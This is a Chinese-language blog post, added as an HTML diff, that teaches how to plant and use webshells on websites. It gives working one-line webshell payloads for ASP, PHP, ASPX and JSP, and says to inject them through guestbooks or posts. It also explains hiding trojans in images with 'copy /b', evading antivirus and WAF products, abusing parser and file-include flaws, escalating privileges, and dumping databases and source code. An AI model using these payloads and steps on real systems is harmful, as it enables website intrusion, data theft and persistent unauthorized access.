@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 脚本木马的工作原理</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>脚本木马的工作原理 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/27
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/shell篇">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                shell<hanla></hanla>篇
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p><hanla></hanla>拿到<hanla></hanla>webshell<br><hanla></hanla>可以对网站源码任意修改</p>
+ <span id="more"></span>
+
+<p>前提有修改权限<br><hanla></hanla>xx.com/uploafile/x.asp<br>xx.com/dama.asp  </p>
+<p> <a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhXXp"><img src="https://s3.jpg.cm/2021/09/27/IkhXXp.png" alt="IkhXXp.png"></a></p>
+<h2 id="webshell的种类"><a href="#webshell的种类" class="headerlink" title="webshell的种类"></a><hanla></hanla>webshell<hanla></hanla>的种类</h2><p><hanla></hanla>1.<hanla></hanla>一句话木马<br><hanla></hanla>2.<hanla></hanla>小马<br><hanla></hanla>3.<hanla></hanla>大马<br><hanla></hanla>4.<hanla></hanla>打包马<br><hanla></hanla>5.<hanla></hanla>脱裤马<br><hanla></hanla>6.<hanla></hanla>等等  </p>
+<p>有马只是对网站有修改权限<br>不能对服务器修改<br>比如一个服务器有<br><hanla></hanla>a,b,c<hanla></hanla>站点<br><hanla></hanla>默认权限只能对<hanla></hanla>a<hanla></hanla>网站进行访问<br><hanla></hanla>iis 网络服务用户，容器权限<br><hanla></hanla>webshell 取决于容器运行权限 iis 网络用户<br><hanla></hanla>apache   apche<hanla></hanla>用户<br>提权 system  权限  </p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>介绍：<br>一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。  </p>
+<p>&lt;%execute request(“value”)%&gt;  </p>
+<p>免杀问题<br><hanla></hanla>safedogc<br><hanla></hanla>d<hanla></hanla>盾<br>云锁<br><hanla></hanla>360<br><hanla></hanla>阿里云防护<br><hanla></hanla>bypass  </p>
+<p>黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>&lt;%execute request(“value”)%&gt;<br><hanla></hanla>其中<hanla></hanla>value<hanla></hanla>是值，所以你可以更改自己的值，前面的<hanla></hanla>request<hanla></hanla>就是获取这个值<br><hanla></hanla>&lt;%eval request(“value”)%&gt;(  现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br><hanla></hanla>知道了数据库的<hanla></hanla>URL，就可以利用本地一张网页进行连接得到<hanla></hanla>Webshell。<br><hanla></hanla>（不知道数据库也可以，只要知道<hanla></hanla>&lt;%eval request(“value”)%&gt;<hanla></hanla>这个文件被插入到哪一个<hanla></hanla>ASP<hanla></hanla>文件里面就可以了。）<br><hanla></hanla>这就被称为一句话木马，它是基于<hanla></hanla>B/S<hanla></hanla>结构的。</p>
+<h2 id="常见写法"><a href="#常见写法" class="headerlink" title="常见写法"></a>常见写法</h2><pre><code><hanla></hanla>asp<hanla></hanla>一句话木马：
+&lt;%eval request("c")%&gt;
+  
+php<hanla></hanla>一句话木马：
+<!--?php @eval($_POST[value]);?-->
+   
+aspx<hanla></hanla>一句话木马：
+&lt;%@ Page Language="Jscript"%&gt;
+&lt;%eval(Request.Item["value"])%&gt;
+
+jsp<hanla></hanla>一句话
+&lt;%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%&gt;
+</code></pre>
+<p><hanla></hanla>iis<hanla></hanla>容器 （asp/aspx/php)<br><hanla></hanla>如果容器支持其他脚本，可以上传其他脚本木马</p>
+<p>apache / nginx<br><hanla></hanla>php 一般很少支持<hanla></hanla>asp</p>
+<p><hanla></hanla>aspx /asp<hanla></hanla>一般这两种互相支持</p>
+<p><hanla></hanla>iis<hanla></hanla>容器 asp 脚本权限 和<hanla></hanla>aspx 脚本权限一样吗？<br>aspx 高一些<br><hanla></hanla>调用<hanla></hanla>cms aspx<hanla></hanla>马可以调用<hanla></hanla>cmd  asp<hanla></hanla>不可以</p>
+<p>jsp  /tomcat/jboss  weblogic  Administrator system root<br><hanla></hanla>直接提权<br>存在降权  public 网络服务用户 </p>
+<h2 id="一句话的使用"><a href="#一句话的使用" class="headerlink" title="一句话的使用"></a>一句话的使用</h2><p><hanla></hanla>首先,<hanla></hanla>找到数据库是<hanla></hanla>asp<hanla></hanla>格式的网站,<hanla></hanla>然后,<hanla></hanla>以留言板,<hanla></hanla>或者发表文章的方式,<br><hanla></hanla>把一句话添加到<hanla></hanla>asp<hanla></hanla>数据库，或者加进<hanla></hanla>asp<hanla></hanla>网页.<br><hanla></hanla>记住!<hanla></hanla>我们的目的是把一句话<br><hanla></hanla>&lt;%execute request(“value”)%&gt;<hanla></hanla>添加到数据库,<hanla></hanla>无论任何方式!<br><hanla></hanla>然后打开客户端<br><hanla></hanla>(就是你电脑上面的那个<hanla></hanla>htm<hanla></hanla>文件),<hanla></hanla>填上加入了一句话的<hanla></hanla>asp<hanla></hanla>文件,<hanla></hanla>或者是<hanla></hanla>asp<hanla></hanla>网页,<hanla></hanla>然后进  入此网站服务器。</p>
+<h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><p>一句话木马和菜刀都是用来传大马<br><hanla></hanla>小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用<hanla></hanla>nginx<hanla></hanla>或者<hanla></hanla>IIS6<hanla></hanla>的解析漏洞来运行，不过功能少，一般只有上传等功能。<br>主要用来上传大马<br>我自己传的时候只能用记事本打开不然有问题传不上去</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikhcv6"><img src="https://s3.jpg.cm/2021/09/27/Ikhcv6.png" alt="Ikhcv6.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikh6H4"><img src="https://s3.jpg.cm/2021/09/27/Ikh6H4.png" alt="Ikh6H4.png"></a></p>
+<p><hanla></hanla>大马有漏洞：？profile=a<hanla></hanla>可以把密码爆出来</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhVgX"><img src="https://s3.jpg.cm/2021/09/27/IkhVgX.png" alt="IkhVgX.png"></a></p>
+<p>或者用这个插件可以把密码爆破出来</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikh8ZD"><img src="https://s3.jpg.cm/2021/09/27/Ikh8ZD.png" alt="Ikh8ZD.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhUaT"><img src="https://s3.jpg.cm/2021/09/27/IkhUaT.png" alt="IkhUaT.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhueE"><img src="https://s3.jpg.cm/2021/09/27/IkhueE.png" alt="IkhueE.png"></a></p>
+<p>然后点击编辑就能查看密码</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Ikh1sQ"><img src="https://s3.jpg.cm/2021/09/27/Ikh1sQ.png" alt="Ikh1sQ.png"></a></p>
+<p> 这个码上传了目录看不见的<br><hanla></hanla>dir /a<hanla></hanla>可以看见<br><hanla></hanla>type xx.asp<hanla></hanla>能看内容   </p>
+<p><hanla></hanla>用<hanla></hanla>xx.asp  去替换他<br><hanla></hanla>然后在删掉<hanla></hanla>xx.asp<br><hanla></hanla>因为黑客可能用大马锁定了<br>右键检查—审查元素—修改需要锁定的文件   </p>
+<h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><p><hanla></hanla>大马体积比较大  一般<hanla></hanla>50K<hanla></hanla>以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，<br>执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，<br>而大多代码如不加密的话很多杀毒厂商开始追杀此类程序  </p>
+<p>作用用途：<br>提权<br>打包<br>脱裤<br>增删文件<br>等等</p>
+<h2 id="常见一句话客户端"><a href="#常见一句话客户端" class="headerlink" title="常见一句话客户端"></a>常见一句话客户端</h2><p>一句话最常用的客户端为：<br>一句话客户端增强版<br>中国菜刀<br>中国砍刀<br><hanla></hanla>lanker<hanla></hanla>一句话客户端<br><hanla></hanla>ZV<hanla></hanla>新型<hanla></hanla>PHP<hanla></hanla>一句话木马客户端<hanla></hanla>GUI<hanla></hanla>版<br><hanla></hanla>webacoo<br>weveely<br><hanla></hanla>msf 生成的<hanla></hanla>aspx、asp、php、jsp、各种<hanla></hanla>payload（一般生成 .exe  比<hanla></hanla>php<hanla></hanla>高)<br><hanla></hanla>蚁剑<br>冰蝎<br>哥斯拉<br><hanla></hanla>黑帽喜欢<hanla></hanla>xise  </p>
+<p>菜刀连接地址不能多也不能少，</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhHKh"><img src="https://s3.jpg.cm/2021/09/27/IkhHKh.png" alt="IkhHKh.png"></a></p>
+<p>有时候上传大马可能不允许，但是新建在保存可以<br>有的通过文件包含上传大马<br><hanla></hanla>新建一个<hanla></hanla>n.asp,<hanla></hanla>同一级不用写路径   </p>
+<!--#include file="2.jpg"-->   
+<p>还可以包含远程马<br>或者多级包含<br><hanla></hanla>a.asp 包含 b.asp 包含 c.asp 包含<hanla></hanla>ima.jpg  </p>
+<h3 id="webshell包含"><a href="#webshell包含" class="headerlink" title="webshell包含"></a><hanla></hanla>webshell<hanla></hanla>包含</h3><p><hanla></hanla>将大马保存为<hanla></hanla>2.jpg<br><hanla></hanla>将文件包含代码保存为<hanla></hanla>x.asp<br><hanla></hanla>内容：</p>
+<pre><code><hanla></hanla><!--#include file="2.jpg"-->  
+一并上传到同目录下，访问<hanla></hanla>x.asp<hanla></hanla>即可。  
+php<hanla></hanla>包含代码如下，使用方法相同。  
+<!--?=include '2.jpg'?-->  
+保存为<hanla></hanla>x.php  
+</code></pre>
+<p>菜刀还可以连接数据库</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkhtWS"><img src="https://s3.jpg.cm/2021/09/27/IkhtWS.png" alt="IkhtWS.png"></a></p>
+<p><hanla></hanla>这时候尝试运行<hanla></hanla>cmd，发现没有权限自己上传一个<hanla></hanla>cmd<hanla></hanla>就可以了</p>
+<p><img src="https://i.loli.net/2021/09/27/DNRsL1YnHuGoUcp.png" alt="21.png"></p>
+<p>菜刀可以查看目录上传文件，还可以连接数据库，脱裤<br><hanla></hanla>运行<hanla></hanla>cmd ，有时候运行<hanla></hanla>cmd<hanla></hanla>失败可以上传一个<hanla></hanla>cmd.exe<hanla></hanla>上去<br>有时候上传不上去，是缓存问题<br>右键跟新缓存，重新上传  </p>
+<p><img src="https://i.loli.net/2021/09/27/1OB37iw4chdLYnu.png" alt="22.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/Edlsf6AFeTHIDNh.png" alt="23.png"></p>
+<p><hanla></hanla>上传一个<hanla></hanla>pr<hanla></hanla>从网络权限到管理员权限<br>或者大马提权，这是最简单的一种提权方式</p>
+<p><img src="https://i.loli.net/2021/09/27/EGxWUs54TkFyRZw.png" alt="24.png"></p>
+<p><hanla></hanla>加入你上传的是<hanla></hanla>php<hanla></hanla>的马，对方的脚本是<hanla></hanla>php5.2.17<br><hanla></hanla>你发现你连不上，用<hanla></hanla>2016<hanla></hanla>菜刀连不上，要用过狗狗菜刀才能连上（魔术引号问题）</p>
+<p>这里有篇文章是冰蝎子，蚁剑，哥斯拉的对比</p>
+<pre><code>https://blog.csdn.net/weixin_54161921/article/details/118579926?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163273383216780357283376%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163273383216780357283376&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-118579926.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%86%B0%E8%9D%8E%E8%9A%81%E5%89%91%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E5%8C%BA%E5%88%AB&amp;spm=1018.2226.3001.4187
+</code></pre>
+<h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p><hanla></hanla>运行命令<br><hanla></hanla>weevely</p>
+<p><img src="https://i.loli.net/2021/09/27/bm9PslGdJcYuDUa.png" alt="25.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/2La5f9HEq3Dg1CA.png" alt="26.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/FsO4SUNPI8tqZiJ.png" alt="27.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/lvWfC6GbZ8Mqdjx.png" alt="28.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/9Fx7qvSBc24PJHh.png" alt="29.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/JeKkDz3P7HTOMB6.png" alt="30.png"></p>
+<p>：shell_sh</p>
+<p><img src="https://i.loli.net/2021/09/27/BWXqLldjeoNpCg6.png" alt="31.png"></p>
+<h3 id="webshell免杀技巧"><a href="#webshell免杀技巧" class="headerlink" title="webshell免杀技巧"></a><hanla></hanla>webshell<hanla></hanla>免杀技巧</h3><p><hanla></hanla>默认过<hanla></hanla>waf，可是马免杀了，菜刀还要免杀</p>
+<p><img src="https://i.loli.net/2021/09/27/gCvIRlXAs8PbNMi.png" alt="32.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/W2CygLMR9vZOYJE.png" alt="33.png"></p>
+<p><hanla></hanla>dedecms<hanla></hanla>后台可以列目录<br>菜刀不可以<br><hanla></hanla>b374k 马免杀  </p>
+<p><hanla></hanla>用<hanla></hanla>c32asm<hanla></hanla>做图片马<br><hanla></hanla>C32<hanla></hanla>下做一句话<br><hanla></hanla>打开<hanla></hanla>c32，<br>把图片放里面，写入一句话保存。。<br>退出<br><hanla></hanla>cmd<hanla></hanla>下做一句话<br><hanla></hanla>copy /b 1.jpg+1.asp 2.jpg<br><hanla></hanla>win7<hanla></hanla>下右键图片，在属性-&gt;<hanla></hanla>详细信息-&gt;<hanla></hanla>版权内插入一句话即可  </p>
+<p><hanla></hanla>配合解析漏洞拿<hanla></hanla>shell<br><hanla></hanla>上传图片格式配置解析漏洞拿<hanla></hanla>shell  </p>
+<p>/x.asp/x.jpg<br>x.cer<br>x.asa<br>x.php.xxx<br>x.jpg/.php  </p>
+<p><hanla></hanla>利用文件包含拿<hanla></hanla>shell<br><hanla></hanla>将大马保存为<hanla></hanla>2.jpg<br><hanla></hanla>将文件包含代码保存为<hanla></hanla>x.asp<br><hanla></hanla>内容：  </p>
+<pre><code><hanla></hanla><!--#include file="2.jpg"--> 
+一并上传到同目录下，访问<hanla></hanla>x.asp<hanla></hanla>即可。
+php<hanla></hanla>包含代码如下，使用方法相同。
+<!--?=include '2.jpg'?-->
+保存为<hanla></hanla>x.php
+</code></pre>
+<p>有些检测文件内容里面有没有代码</p>
+<pre><code>&lt;?php   ?&gt;
+&lt;%   %&gt;
+&lt;?    ?&gt;
+&lt;script lanuage="php"&gt;&lt;/script&gt;
+&lt;?=include "x.jpg"?&gt;
+</code></pre>
+<p>查找后门：<br>我的大马有后门<br><hanla></hanla>查找<hanla></hanla>webshell<hanla></hanla>后门<br>找到后门地址<br><hanla></hanla>反搞<hanla></hanla>webshell<hanla></hanla>箱子  </p>
+<p>给大马留后门<br><hanla></hanla>用<hanla></hanla>xxs<hanla></hanla>平台给大马留后门  </p>
+<p>一句话爆破<br>爆别人的一句话木马  </p>
+<p><img src="https://i.loli.net/2021/09/27/JGIZ5lmYn4RuLdF.png" alt="34.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/XFTj1LS5JyeU3dr.png" alt="35.png"></p>
+<p>源码打包下载<br><hanla></hanla>打包之后服务器<hanla></hanla>2012，2016<hanla></hanla>不能下载，可以改成<hanla></hanla>zip,rar<hanla></hanla>进行下载  </p>
+<p><img src="https://i.loli.net/2021/09/27/ahkCqnvoSgXrbGH.png" alt="36.png"></p>
+<p><img src="https://i.loli.net/2021/09/27/3JetZPz6NHITaR7.png" alt="37.png"></p>
+<p><hanla></hanla>密码：admin,<hanla></hanla>文件太大会直接报错，最好几个几个的打包</p>
+<p><img src="https://i.loli.net/2021/09/27/HN469pVRTWXhGd2.png" alt="38.png"></p>
+<p>命令行调用 RAR 打包：<br>rar a -k -r -s -m3 c:\1.rar c:\folder<br><hanla></hanla>用途：打包源码 打包任意文件（数据库）<br><hanla></hanla>注意：rar<hanla></hanla>文件路径 符号问题（”"）  </p>
+<p>各种（asp/aspx/php/）打包马的使用<br><hanla></hanla>phpmyzip<hanla></hanla>打包码打包  </p>
+<p><hanla></hanla>adminer  这玩意必会的，百度<hanla></hanla>adminer<br><hanla></hanla>比如阿里云库，不能通过本地连接、<br><hanla></hanla>把<hanla></hanla>adminer<hanla></hanla>上传，可以写本地地址，或者远程地址<br>可以爆破了，除了脱裤，还可以修改数据库数据  </p>
+<p><hanla></hanla>orcale<hanla></hanla>这样连<br>把数据库写到地址后面，有端口还要加端口  </p>
+<p><img src="https://i.loli.net/2021/09/27/s6gfLQROEarhpCu.png" alt="39.png"></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
